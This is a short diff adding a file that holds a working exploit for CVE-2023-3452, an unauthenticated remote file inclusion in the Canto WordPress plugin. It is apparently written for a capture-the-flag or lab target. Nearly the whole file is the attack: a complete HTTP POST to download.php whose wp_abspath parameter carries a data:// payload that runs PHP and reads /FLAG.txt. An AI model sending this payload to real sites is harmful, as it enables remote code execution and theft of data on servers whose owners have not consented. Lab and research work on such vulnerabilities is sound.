@@ -1,0 +1,7 @@
+# CVE-2023-3452: Canto WordPress Plugin <= 3.0.4 unauthenticated RFI via wp_abspath parameter in download.php. data:// stream wrapper used to execute arbitrary PHP code and read /FLAG.txt
+
+POST /wp-content/plugins/canto/includes/lib/download.php HTTP/1.1
+Host: 172.17.0.1:55683
+Content-Length: 74
+
+wp_abspath=data://text/plain,<?php echo file_get_contents('/FLAG.txt'); ?>
